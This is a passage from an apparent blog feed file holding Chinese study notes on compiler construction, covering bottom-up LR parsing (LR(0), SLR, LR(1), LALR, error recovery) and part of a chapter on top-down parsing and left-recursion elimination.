        <tags>
            
            <tag> 夏令营 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>编译原理第6章：自底向上的语法分析</title>
      <link href="/2024/07/02/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC6%E7%AB%A0%EF%BC%9A%E8%87%AA%E5%BA%95%E5%90%91%E4%B8%8A%E7%9A%84%E8%AF%AD%E6%B3%95%E5%88%86%E6%9E%90/"/>
      <url>/2024/07/02/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC6%E7%AB%A0%EF%BC%9A%E8%87%AA%E5%BA%95%E5%90%91%E4%B8%8A%E7%9A%84%E8%AF%AD%E6%B3%95%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h1 id="1-自底向上分析概述"><a href="#1-自底向上分析概述" class="headerlink" title="1 自底向上分析概述"></a>1 自底向上分析概述</h1><p>从分析树的底部(叶节点)向顶部(根节点)方向构造分析树，可以看成是将输入串w归约为文法开始符号S的过程。</p><ul><li>自顶向下的语法分析采用最左推导方式</li><li>自底向上的语法分析采用最左归约方式（反向构造最右推导）</li></ul><p>自底向上语法分析的通用框架：移入-归约分析(Shift-Reduce Parsing)。</p><p><img src="/2024/07/02/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC6%E7%AB%A0%EF%BC%9A%E8%87%AA%E5%BA%95%E5%90%91%E4%B8%8A%E7%9A%84%E8%AF%AD%E6%B3%95%E5%88%86%E6%9E%90/image_qdNBMdVK4Y.png"></p><h2 id="1-1-移入-归约分析的工作过程"><a href="#1-1-移入-归约分析的工作过程" class="headerlink" title="1.1 移入-归约分析的工作过程"></a>1.1 移入-归约分析的工作过程</h2><p>在对输入串的一次从左到右扫描过程中，语法分析器将零个或多个输入符号移入到栈的顶端，直到它可以对栈顶的一个文法符号串β进行归约为止。</p><p>然后，它将β归约为某个产生式的左部，语法分析器不断地重复这个循环，直到它检测到一个语法错误，或者栈中包含了开始符号且输入缓冲区为空(当出现这种情况时，语法分析器停止运行，并宣称成功完成了语法分析)为止。</p><h2 id="1-2-移入-归约分析器可采取的4种动作"><a href="#1-2-移入-归约分析器可采取的4种动作" class="headerlink" title="1.2 移入-归约分析器可采取的4种动作"></a>1.2 移入-归约分析器可采取的4种动作</h2><ul><li><strong>移入</strong>：将下一个输入符号移到栈的顶端</li><li><strong>归约</strong>：被归约的符号串的右端必然处于栈顶。语法分析器在栈中确定这个串的左端，并决定用哪个非终结符来替换这个串</li><li><strong>接收</strong>：宣布语法分析过程成功完成</li><li><strong>报错</strong>：发现一个语法错误，并调用错误恢复子例程</li></ul><p>移入-归约分析中存在的问题：如何正确地识别句柄？</p><hr><h1 id="2-LR分析概述"><a href="#2-LR分析概述" class="headerlink" title="2 LR分析概述"></a>2 LR分析概述</h1><p>LR文法（Knuth, 1963）是最大的、可以构造出相应移入-归约语法分析器的文法类。</p><ul><li>L：对输入进行从左到右的扫描</li><li>R：反向构造出一个最右推导序列</li></ul><p>LR(k)分析：需要向前查看k个输入符号的LR分析。其中，$k&#x3D; 0$ 和 $k &#x3D; 1$ 这两种情况具有实践意义，当省略(k)时，表示k &#x3D;1。</p><h2 id="2-1-LR-分析法的基本原理"><a href="#2-1-LR-分析法的基本原理" class="headerlink" title="2.1 LR 分析法的基本原理"></a>2.1 LR 分析法的基本原理</h2><p>自底向上分析的关键问题是如何正确地识别句柄，句柄是逐步形成的，用“状态”表示句柄识别的进展程度。</p><p><img src="/2024/07/02/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC6%E7%AB%A0%EF%BC%9A%E8%87%AA%E5%BA%95%E5%90%91%E4%B8%8A%E7%9A%84%E8%AF%AD%E6%B3%95%E5%88%86%E6%9E%90/image_98PmbOgupx.png"></p><h2 id="2-2-LR-分析器（自动机）的总体结构"><a href="#2-2-LR-分析器（自动机）的总体结构" class="headerlink" title="2.2 LR 分析器（自动机）的总体结构"></a>2.2 LR 分析器（自动机）的总体结构</h2><p><img src="/2024/07/02/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC6%E7%AB%A0%EF%BC%9A%E8%87%AA%E5%BA%95%E5%90%91%E4%B8%8A%E7%9A%84%E8%AF%AD%E6%B3%95%E5%88%86%E6%9E%90/image_YMk2k0gFHT.png"></p><h2 id="2-3-LR-分析器的工作过程"><a href="#2-3-LR-分析器的工作过程" class="headerlink" title="2.3 LR 分析器的工作过程"></a>2.3 LR 分析器的工作过程</h2><p><img src="/2024/07/02/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC6%E7%AB%A0%EF%BC%9A%E8%87%AA%E5%BA%95%E5%90%91%E4%B8%8A%E7%9A%84%E8%AF%AD%E6%B3%95%E5%88%86%E6%9E%90/image_NMP4T0iFeG.png"></p><p><img src="/2024/07/02/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC6%E7%AB%A0%EF%BC%9A%E8%87%AA%E5%BA%95%E5%90%91%E4%B8%8A%E7%9A%84%E8%AF%AD%E6%B3%95%E5%88%86%E6%9E%90/image_7kqN7zkFZK.png"></p><p><img src="/2024/07/02/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC6%E7%AB%A0%EF%BC%9A%E8%87%AA%E5%BA%95%E5%90%91%E4%B8%8A%E7%9A%84%E8%AF%AD%E6%B3%95%E5%88%86%E6%9E%90/image_xabUIsjCjy.png"></p><h2 id="2-4-LR分析算法"><a href="#2-4-LR分析算法" class="headerlink" title="2.4 LR分析算法"></a>2.4 LR分析算法</h2><p><img src="/2024/07/02/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC6%E7%AB%A0%EF%BC%9A%E8%87%AA%E5%BA%95%E5%90%91%E4%B8%8A%E7%9A%84%E8%AF%AD%E6%B3%95%E5%88%86%E6%9E%90/image_WMBTxRr0mH.png"></p><p>如何构造给定文法的LR分析表？</p><ul><li>LR(0)分析</li><li>SLR分析</li><li>LR(1)分析</li><li>LALR分析</li></ul><hr><h1 id="3-LR-0-分析"><a href="#3-LR-0-分析" class="headerlink" title="3  LR(0)分析"></a>3  LR(0)分析</h1><p>右部某位置标有圆点的产生式称为相应文法的一个LR(0)项目（简称为项目）。</p><p>$$<br>A \rightarrow \alpha_{1} \cdot \alpha_{2}<br>$$</p><p><img src="/2024/07/02/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC6%E7%AB%A0%EF%BC%9A%E8%87%AA%E5%BA%95%E5%90%91%E4%B8%8A%E7%9A%84%E8%AF%AD%E6%B3%95%E5%88%86%E6%9E%90/image_Hr-eStVwz5.png"></p><h2 id="3-1-增广文法"><a href="#3-1-增广文法" class="headerlink" title="3.1 增广文法"></a>3.1 增广文法</h2><p>如果$G$是一个以$S$为开始符号的文法，则$G$的增广文法$G’$就是在$G$中加上新开始符号$S’$和产生式$S’ → S$而得到的文法。</p><p><img src="/2024/07/02/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC6%E7%AB%A0%EF%BC%9A%E8%87%AA%E5%BA%95%E5%90%91%E4%B8%8A%E7%9A%84%E8%AF%AD%E6%B3%95%E5%88%86%E6%9E%90/image_EA5Hqa_IF_.png"></p><p>引入这个新的开始产生式的目的是使得文法开始符号仅出现在一个产生式的左边，从而使得分析器只有一个接受状态。</p><p><img src="/2024/07/02/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC6%E7%AB%A0%EF%BC%9A%E8%87%AA%E5%BA%95%E5%90%91%E4%B8%8A%E7%9A%84%E8%AF%AD%E6%B3%95%E5%88%86%E6%9E%90/image_dDv_gi68y7.png"></p><h3 id="3-1-1-后继项目"><a href="#3-1-1-后继项目" class="headerlink" title="3.1.1 后继项目"></a>3.1.1 后继项目</h3><p>同属于一个产生式的项目，但圆点的位置只相差一个符号，则称后者是前者的后继项目。</p><p>$A→α· Xβ$的后继项目是$A→αX·β$。</p><p>上述15个项目中是否会有某些项目是等价的？</p><p>可以把等价的项目组成一个项目集(I)，称为<strong>项目集闭包</strong>（Closure of Item Sets），每个项目集闭包对应着自动机的一个状态。</p><h2 id="3-2-LR-0-自动机"><a href="#3-2-LR-0-自动机" class="headerlink" title="3.2 LR(0)自动机"></a>3.2 LR(0)自动机</h2><p><img src="/2024/07/02/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC6%E7%AB%A0%EF%BC%9A%E8%87%AA%E5%BA%95%E5%90%91%E4%B8%8A%E7%9A%84%E8%AF%AD%E6%B3%95%E5%88%86%E6%9E%90/image_kaQzEsWreT.png"></p><p><img src="/2024/07/02/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC6%E7%AB%A0%EF%BC%9A%E8%87%AA%E5%BA%95%E5%90%91%E4%B8%8A%E7%9A%84%E8%AF%AD%E6%B3%95%E5%88%86%E6%9E%90/image_6vWnPIdK6F.png"></p><h2 id="3-3-移进规约冲突"><a href="#3-3-移进规约冲突" class="headerlink" title="3.3 移进规约冲突"></a>3.3 移进规约冲突</h2><p><img src="/2024/07/02/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC6%E7%AB%A0%EF%BC%9A%E8%87%AA%E5%BA%95%E5%90%91%E4%B8%8A%E7%9A%84%E8%AF%AD%E6%B3%95%E5%88%86%E6%9E%90/image_fwkpuRwl2Q.png"></p><p>表达式文法的LR(0)分析表含有移进&#x2F;归约冲突：</p><p><img src="/2024/07/02/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC6%E7%AB%A0%EF%BC%9A%E8%87%AA%E5%BA%95%E5%90%91%E4%B8%8A%E7%9A%84%E8%AF%AD%E6%B3%95%E5%88%86%E6%9E%90/image_7nT-c4FlQ3.png"></p><p>如果LR(0)分析表中没有语法分析动作冲突，那么给定的文法就称为LR(0)文法。</p><p>不是所有CFG都能用LR(0)方法进行分析，也就是说，CFG不总是LR(0)文法。</p><hr><h1 id="4-SLR分析"><a href="#4-SLR分析" class="headerlink" title="4 SLR分析"></a>4 SLR分析</h1><p>SLR(1)分析法的基本思想：看要规约项目的FOLLOW集中是否包含输入的符号。</p><p><img src="/2024/07/02/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC6%E7%AB%A0%EF%BC%9A%E8%87%AA%E5%BA%95%E5%90%91%E4%B8%8A%E7%9A%84%E8%AF%AD%E6%B3%95%E5%88%86%E6%9E%90/image_x0XKooBSra.png"></p><p><img src="/2024/07/02/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC6%E7%AB%A0%EF%BC%9A%E8%87%AA%E5%BA%95%E5%90%91%E4%B8%8A%E7%9A%84%E8%AF%AD%E6%B3%95%E5%88%86%E6%9E%90/image_b4r1I409zl.png"></p><h2 id="4-1-SLR-1-分析表构造算法"><a href="#4-1-SLR-1-分析表构造算法" class="headerlink" title="4.1 SLR(1) 分析表构造算法"></a>4.1 SLR(1) 分析表构造算法</h2><p><img src="/2024/07/02/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC6%E7%AB%A0%EF%BC%9A%E8%87%AA%E5%BA%95%E5%90%91%E4%B8%8A%E7%9A%84%E8%AF%AD%E6%B3%95%E5%88%86%E6%9E%90/image_kf3ekvMi75.png"></p><p>如果给定文法的SLR(1)分析表中不存在有冲突的动作，那么该文法称为SLR(1)文法。</p><hr><h1 id="5-LR-1-分析"><a href="#5-LR-1-分析" class="headerlink" title="5 LR(1)分析"></a>5 LR(1)分析</h1><h2 id="5-1-LR-1-分析法的提出"><a href="#5-1-LR-1-分析法的提出" class="headerlink" title="5.1 LR(1)分析法的提出"></a>5.1 LR(1)分析法的提出</h2><p>SLR(1)分析存在的问题：</p><p>SLR(1)只是简单地考察下一个输入符号b是否属于与归约项目A→α相关联的FOLLOW(A)，但b∈FOLLOW(A)只是归约α的一个必要条件，而非充分条件。</p><p>对于产生式 A→α的归约，在不同的使用位置，A会要求不同的后继符号。</p><p><img src="/2024/07/02/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC6%E7%AB%A0%EF%BC%9A%E8%87%AA%E5%BA%95%E5%90%91%E4%B8%8A%E7%9A%84%E8%AF%AD%E6%B3%95%E5%88%86%E6%9E%90/image_tNVNMy-eaK.png"></p><p>在特定位置，A的后继符集合是FOLLOW(A)的子集。</p><h2 id="5-2-规范LR-1-项目"><a href="#5-2-规范LR-1-项目" class="headerlink" title="5.2 规范LR(1)项目"></a>5.2 规范LR(1)项目</h2><p>将一般形式为 [A→α·β, a]的项称为 LR(1) 项，其中A→αβ 是一个产生式，a 是一个终结符(这里将$视为一个特殊的终结符)它表示在当前状态下，A后面必须紧跟的终结符，称为该项的<strong>展望符</strong>(<code>lookahead</code>)。</p><ul><li>LR(1)中的1指的是第二个分量的长度</li></ul><p>在形如[A→α·β, a]且β ≠ ε的项中，展望符a没有任何作用，但是一个形如[A→α·, a]的项在只有在下一个输入符号等于a时才可以按照A→α 进行归约。</p><p>这样的a的集合总是FOLLOW(A)的子集，而且它通常是一个真子集。</p><p><img src="/2024/07/02/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC6%E7%AB%A0%EF%BC%9A%E8%87%AA%E5%BA%95%E5%90%91%E4%B8%8A%E7%9A%84%E8%AF%AD%E6%B3%95%E5%88%86%E6%9E%90/image_1Z9kZ5A7X5.png"></p><p><img src="/2024/07/02/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC6%E7%AB%A0%EF%BC%9A%E8%87%AA%E5%BA%95%E5%90%91%E4%B8%8A%E7%9A%84%E8%AF%AD%E6%B3%95%E5%88%86%E6%9E%90/image_WFd6vdq-Ls.png"></p><p><img src="/2024/07/02/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC6%E7%AB%A0%EF%BC%9A%E8%87%AA%E5%BA%95%E5%90%91%E4%B8%8A%E7%9A%84%E8%AF%AD%E6%B3%95%E5%88%86%E6%9E%90/image_c_cBuqxbob.png"></p><hr><h1 id="6-LALR分析"><a href="#6-LALR分析" class="headerlink" title="6 LALR分析"></a>6 LALR分析</h1><h2 id="6-1-LALR-lookahead-LR-分析的基本思想"><a href="#6-1-LALR-lookahead-LR-分析的基本思想" class="headerlink" title="6.1 LALR(lookahead-LR)分析的基本思想"></a>6.1 LALR(lookahead-LR)分析的基本思想</h2><p>寻找具有相同核心的LR (1) 项集，并将这些项集合并为一个项集。 所谓项集的核心就是其第一分量的集合。</p><p>然后根据合并后得到的项集族构造语法分析表，如果分析表中没有语法分析动作冲突，给定的文法就称为<code>LALR(1)</code>文法，就可以根据该分析表进行语法分析。</p><p><img src="/2024/07/02/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC6%E7%AB%A0%EF%BC%9A%E8%87%AA%E5%BA%95%E5%90%91%E4%B8%8A%E7%9A%84%E8%AF%AD%E6%B3%95%E5%88%86%E6%9E%90/image_o4Go5S4qLk.png"></p><p><img src="/2024/07/02/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC6%E7%AB%A0%EF%BC%9A%E8%87%AA%E5%BA%95%E5%90%91%E4%B8%8A%E7%9A%84%E8%AF%AD%E6%B3%95%E5%88%86%E6%9E%90/image_SB7t8duKQ5.png"></p><p>合并同心项集后，虽然节省了空间，也不产生冲突，但可能会推迟错误的发现，同时<code>LALR</code>分析法可能会作多余的归约动作，但绝不会作错误的移进操作。</p><h2 id="6-2-LALR-1-的特点"><a href="#6-2-LALR-1-的特点" class="headerlink" title="6.2 LALR(1)的特点"></a>6.2 LALR(1)的特点</h2><ol><li>形式上与LR(1)相同</li><li>大小上与LR(0)&#x2F;SLR相当</li><li>分析能力介于SLR和LR(1)二者之间，即$S L R&lt;L A L R(1)&lt;L R(1)$</li><li>合并后的展望符集合仍为FOLLOW集的子集</li></ol><hr><h1 id="7-二义性文法的LR分析"><a href="#7-二义性文法的LR分析" class="headerlink" title="7 二义性文法的LR分析"></a>7 二义性文法的LR分析</h1><p>每个二义性文法都不是LR的，某些类型的二义性文法在语言的描述和实现中很有用。</p><p><img src="/2024/07/02/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC6%E7%AB%A0%EF%BC%9A%E8%87%AA%E5%BA%95%E5%90%91%E4%B8%8A%E7%9A%84%E8%AF%AD%E6%B3%95%E5%88%86%E6%9E%90/image_WMhDAJlISO.png"></p><p><img src="/2024/07/02/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC6%E7%AB%A0%EF%BC%9A%E8%87%AA%E5%BA%95%E5%90%91%E4%B8%8A%E7%9A%84%E8%AF%AD%E6%B3%95%E5%88%86%E6%9E%90/image_H5sDw1aSR6.png"></p><p>二义性文法的使用：</p><p>应该保守地使用二义性文法，并且必须在严格控制之下使用，因为稍有不慎就会导致语法分析器所识别的语言出现偏差。</p><hr><h1 id="8-LR分析中的错误处理"><a href="#8-LR分析中的错误处理" class="headerlink" title="8 LR分析中的错误处理"></a>8 LR分析中的错误处理</h1><p><strong>语法错误的检测</strong>：</p><p>当LR分析器在查询分析表并发现一个报错条目时，就检测到了一个语法错误。</p><p><strong>错误恢复策略</strong>：</p><ul><li>恐慌模式错误恢复</li><li>短语层次错误恢复</li></ul><h2 id="8-1-恐慌模式错误恢复"><a href="#8-1-恐慌模式错误恢复" class="headerlink" title="8.1 恐慌模式错误恢复"></a>8.1 恐慌模式错误恢复</h2><p><img src="/2024/07/02/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC6%E7%AB%A0%EF%BC%9A%E8%87%AA%E5%BA%95%E5%90%91%E4%B8%8A%E7%9A%84%E8%AF%AD%E6%B3%95%E5%88%86%E6%9E%90/image_eimLFfNnsP.png"></p><p>从栈顶向下扫描，直到发现某个状态$s_i$，它有一个对应于某个非终结符A的<code>GOTO</code>目标，可以认为从这个A推导出的串中包含错误。</p><p>然后丢弃0个或多个输入符号，直到发现一个可能合法地跟在A之后的符号a为止。</p><p>之后将$s_{i+1}&#x3D;G O T O\left(s_{i}, A\right)$压入栈中，继续进行正常的语法分析。</p><h2 id="8-2-短语层次错误恢复"><a href="#8-2-短语层次错误恢复" class="headerlink" title="8.2 短语层次错误恢复"></a>8.2 短语层次错误恢复</h2><p>检查LR分析表中的每一个报错条目，并根据语言的使用方法来决定程序员所犯的何种错误最有可能引起这个语法错误，然后构造出适当的恢复过程。</p><p><img src="/2024/07/02/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC6%E7%AB%A0%EF%BC%9A%E8%87%AA%E5%BA%95%E5%90%91%E4%B8%8A%E7%9A%84%E8%AF%AD%E6%B3%95%E5%88%86%E6%9E%90/image_S8VIlNOJa9.png"></p><h3 id="8-2-1-带有错误处理子程序的算术表达式文法LR分析表"><a href="#8-2-1-带有错误处理子程序的算术表达式文法LR分析表" class="headerlink" title="8.2.1 带有错误处理子程序的算术表达式文法LR分析表"></a>8.2.1 带有错误处理子程序的算术表达式文法LR分析表</h3><p><img src="/2024/07/02/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC6%E7%AB%A0%EF%BC%9A%E8%87%AA%E5%BA%95%E5%90%91%E4%B8%8A%E7%9A%84%E8%AF%AD%E6%B3%95%E5%88%86%E6%9E%90/image_zfJ5RwpI-8.png"></p><h2 id="8-3-自底向上语法分析小结"><a href="#8-3-自底向上语法分析小结" class="headerlink" title="8.3 自底向上语法分析小结"></a>8.3 自底向上语法分析小结</h2><p><img src="/2024/07/02/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC6%E7%AB%A0%EF%BC%9A%E8%87%AA%E5%BA%95%E5%90%91%E4%B8%8A%E7%9A%84%E8%AF%AD%E6%B3%95%E5%88%86%E6%9E%90/image_QOWXOfg8Ei.png"></p><p><img src="/2024/07/02/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC6%E7%AB%A0%EF%BC%9A%E8%87%AA%E5%BA%95%E5%90%91%E4%B8%8A%E7%9A%84%E8%AF%AD%E6%B3%95%E5%88%86%E6%9E%90/image_c7hAFtthKx.png"></p><p><img src="/2024/07/02/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC6%E7%AB%A0%EF%BC%9A%E8%87%AA%E5%BA%95%E5%90%91%E4%B8%8A%E7%9A%84%E8%AF%AD%E6%B3%95%E5%88%86%E6%9E%90/image_NY3M92gfMH.png"></p>]]></content>
      
      
      <categories>
          
          <category> 专业课 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 编译原理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>编译原理第4章：自顶向下的语法分析</title>
      <link href="/2024/06/30/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC4%E7%AB%A0%EF%BC%9A%E8%87%AA%E9%A1%B6%E5%90%91%E4%B8%8B%E7%9A%84%E8%AF%AD%E6%B3%95%E5%88%86%E6%9E%90/"/>
      <url>/2024/06/30/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC4%E7%AB%A0%EF%BC%9A%E8%87%AA%E9%A1%B6%E5%90%91%E4%B8%8B%E7%9A%84%E8%AF%AD%E6%B3%95%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h1 id="1-自顶向下分析概述"><a href="#1-自顶向下分析概述" class="headerlink" title="1 自顶向下分析概述"></a>1 自顶向下分析概述</h1><p><img src="/2024/06/30/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC4%E7%AB%A0%EF%BC%9A%E8%87%AA%E9%A1%B6%E5%90%91%E4%B8%8B%E7%9A%84%E8%AF%AD%E6%B3%95%E5%88%86%E6%9E%90/image_tEHP2eRtHk.png"></p><p>从分析树的顶部（根节点）向底部（叶节点）方向构造分析树，可以看成是从文法开始符号$S$推导出词串$w$的过程。</p><p><img src="/2024/06/30/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC4%E7%AB%A0%EF%BC%9A%E8%87%AA%E9%A1%B6%E5%90%91%E4%B8%8B%E7%9A%84%E8%AF%AD%E6%B3%95%E5%88%86%E6%9E%90/image_A6OnfpprDm.png"></p><p>每一步推导中，都需要做两个选择：</p><ol><li>替换当前句型中的哪个非终结符</li><li>用该非终结符的哪个候选式进行替换</li></ol><h2 id="1-1-最左推导"><a href="#1-1-最左推导" class="headerlink" title="1.1 最左推导"></a>1.1 最左推导</h2><p>在最左推导中，总是选择每个句型的最左非终结符进行替换。</p><p><img src="/2024/06/30/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC4%E7%AB%A0%EF%BC%9A%E8%87%AA%E9%A1%B6%E5%90%91%E4%B8%8B%E7%9A%84%E8%AF%AD%E6%B3%95%E5%88%86%E6%9E%90/image_5r5f7DUKYX.png"></p><p>如果$\boldsymbol{S} \Rightarrow{ }_{l m}^{*} \boldsymbol{\alpha}$，则称$\alpha$是当前文法的<strong>最左句型</strong>（<code>left-sentential form</code>）。</p><h2 id="1-2-最右推导"><a href="#1-2-最右推导" class="headerlink" title="1.2 最右推导"></a>1.2 最右推导</h2><p>在最右推导中，总是选择每个句型的最右非终结符进行替换。</p><p><img src="/2024/06/30/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC4%E7%AB%A0%EF%BC%9A%E8%87%AA%E9%A1%B6%E5%90%91%E4%B8%8B%E7%9A%84%E8%AF%AD%E6%B3%95%E5%88%86%E6%9E%90/image_oBZYmjGeF_.png"></p><p>在自底向上的分析中，总是采用最左归约的方式，因此把<strong>最左归约</strong>称为<strong>规范归约</strong>，而<strong>最右推导</strong>相应地称为<strong>规范推导</strong>。</p><h2 id="1-3-最左推导和最右推导的唯一性"><a href="#1-3-最左推导和最右推导的唯一性" class="headerlink" title="1.3 最左推导和最右推导的唯一性"></a>1.3 最左推导和最右推导的唯一性</h2><p><img src="/2024/06/30/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC4%E7%AB%A0%EF%BC%9A%E8%87%AA%E9%A1%B6%E5%90%91%E4%B8%8B%E7%9A%84%E8%AF%AD%E6%B3%95%E5%88%86%E6%9E%90/image_RykppazbW-.png"></p><p>如果最左推导和最右推导生成的语法树不是唯一的，那么这个文法就有二义性。</p><h3 id="1-3-1-自顶向下的语法分析采用最左推导方式"><a href="#1-3-1-自顶向下的语法分析采用最左推导方式" class="headerlink" title="1.3.1 自顶向下的语法分析采用最左推导方式"></a>1.3.1 自顶向下的语法分析采用最左推导方式</h3><ol><li>总是选择每个句型的最左非终结符进行替换</li><li>根据输入流中的下一个终结符，选择最左非终结符的一个候选式</li></ol><p><img src="/2024/06/30/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC4%E7%AB%A0%EF%BC%9A%E8%87%AA%E9%A1%B6%E5%90%91%E4%B8%8B%E7%9A%84%E8%AF%AD%E6%B3%95%E5%88%86%E6%9E%90/image_8p6NTn3ABN.png"></p><h2 id="1-4-自顶向下语法分析的通用形式"><a href="#1-4-自顶向下语法分析的通用形式" class="headerlink" title="1.4 自顶向下语法分析的通用形式"></a>1.4 自顶向下语法分析的通用形式</h2><h3 id="1-4-1-递归下降分析"><a href="#1-4-1-递归下降分析" class="headerlink" title="1.4.1 递归下降分析"></a>1.4.1 递归下降分析</h3><ul><li>由一组过程组成，每个过程对应一个非终结符</li><li>从文法开始符号$S$对应的过程开始，其中递归调用文法中其它非终结符对应的过程。如果$S$对应的过程体恰好扫描了整个输入串，则成功完成语法分析</li></ul><p><img src="/2024/06/30/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC4%E7%AB%A0%EF%BC%9A%E8%87%AA%E9%A1%B6%E5%90%91%E4%B8%8B%E7%9A%84%E8%AF%AD%E6%B3%95%E5%88%86%E6%9E%90/image_qv6M0C5xF0.png"></p><h2 id="1-5-预测分析"><a href="#1-5-预测分析" class="headerlink" title="1.5 预测分析"></a>1.5 预测分析</h2><p>预测分析是递归下降分析技术的一个特例，通过在输入中向前看固定个数（通常是一个）符号来选择正确的A-产生式。</p><p>可以对某些文法构造出向前看$k$个输入符号的预测分析器，该类文法有时也称为<strong>LL(k) 文法类</strong>。</p><p>预测分析<strong>不需要回溯</strong>，是一种确定的自顶向下分析方法。</p><hr><h1 id="2-文法转换"><a href="#2-文法转换" class="headerlink" title="2 文法转换"></a>2 文法转换</h1><p>左递归文法会使递归下降分析器陷入无限循环，含有$A→Aα$形式产生式的文法称为是<strong>直接左递归</strong>的(immediate left recursive)。</p><p>如果一个文法中有一个非终结符$A$使得对某个串$α$存在$A \Rightarrow^{+} A \alpha$，那么这个文法就是<strong>左递归</strong>的。</p><p>经过两步或两步以上推导产生的左递归称为是<strong>间接左递归</strong>的。</p><h2 id="2-1-消除左递归"><a href="#2-1-消除左递归" class="headerlink" title="2.1 消除左递归"></a>2.1 消除左递归</h2><h3 id="2-1-1-消除直接左递归"><a href="#2-1-1-消除直接左递归" class="headerlink" title="2.1.1 消除直接左递归"></a>2.1.1 消除直接左递归</h3><p><img src="/2024/06/30/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC4%E7%AB%A0%EF%BC%9A%E8%87%AA%E9%A1%B6%E5%90%91%E4%B8%8B%E7%9A%84%E8%AF%AD%E6%B3%95%E5%88%86%E6%9E%90/image_NXoVDIqW8Z.png"></p><h3 id="2-1-2-消除直接左递归的一般形式"><a href="#2-1-2-消除直接左递归的一般形式" class="headerlink" title="2.1.2 消除直接左递归的一般形式"></a>2.1.2 消除直接左递归的一般形式</h3><p><img src="/2024/06/30/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC4%E7%AB%A0%EF%BC%9A%E8%87%AA%E9%A1%B6%E5%90%91%E4%B8%8B%E7%9A%84%E8%AF%AD%E6%B3%95%E5%88%86%E6%9E%90/image_IT0PziampE.png"></p><p>消除左递归是要付出代价的——引进了一些非终结符和ε_产生式。</p><blockquote><p>任何事情都不是两全其美的，当你获得一些东西的时候，必然也会失去其他东西。</p></blockquote><h3 id="2-1-3-消除间接左递归"><a href="#2-1-3-消除间接左递归" class="headerlink" title="2.1.3 消除间接左递归"></a>2.1.3 消除间接左递归</h3><p><img src="/2024/06/30/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC4%E7%AB%A0%EF%BC%9A%E8%87%AA%E9%A1%B6%E5%90%91%E4%B8%8B%E7%9A%84%E8%AF%AD%E6%B3%95%E5%88%86%E6%9E%90/image_GFr89ScAY7.png"></p><h3 id="2-1-4-消除左递归算法"><a href="#2-1-4-消除左递归算法" class="headerlink" title="2.1.4 消除左递归算法"></a>2.1.4 消除左递归算法</h3><p><img src="/2024/06/30/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC4%E7%AB%A0%EF%BC%9A%E8%87%AA%E9%A1%B6%E5%90%91%E4%B8%8B%E7%9A%84%E8%AF%AD%E6%B3%95%E5%88%86%E6%9E%90/image_a7nw0jJma3.png"></p><h2 id="2-2-提取左公因子"><a href="#2-2-提取左公因子" class="headerlink" title="2.2 提取左公因子"></a>2.2 提取左公因子</h2><p>同一非终结符的多个候选式存在共同前缀，或含有左递归将导致回溯现象。</p><p><img 